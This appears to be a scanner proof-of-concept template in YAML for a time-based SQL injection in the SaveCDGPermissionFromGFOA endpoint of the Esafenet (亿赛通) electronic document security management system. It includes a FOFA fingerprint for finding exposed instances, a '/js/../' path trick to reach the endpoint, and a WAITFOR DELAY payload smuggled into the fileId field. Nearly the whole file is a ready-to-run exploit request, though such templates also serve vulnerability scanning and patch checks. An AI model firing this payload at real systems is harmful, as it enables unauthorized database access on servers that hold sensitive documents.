id: poc-yaml-yisaitong-esafenet-savecdgpermissionfromgfoa-sqli
info:
  name: 亿赛通电子文档安全管理系统 SaveCDGPermissionFromGFOA SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 亿赛通电子文档安全管理系统
  fofa: app="亿赛通-电子文档安全管理系统"
variables:
  t1: random_int(2,5)
  t2: t1 + t1
  t3: t2 + 2
  t4: gbk_encode("电子文档安全管理系统")
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,t4)
- method: POST
  path: /CDGServer3/js/../SaveCDGPermissionFromGFOA
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: fileId=1';WAITFOR DELAY '0:0:{{.t1}}'--&pis=1
  expression: status_code == 200 && body == "" && duration > t2 && duration < t3
transport: http
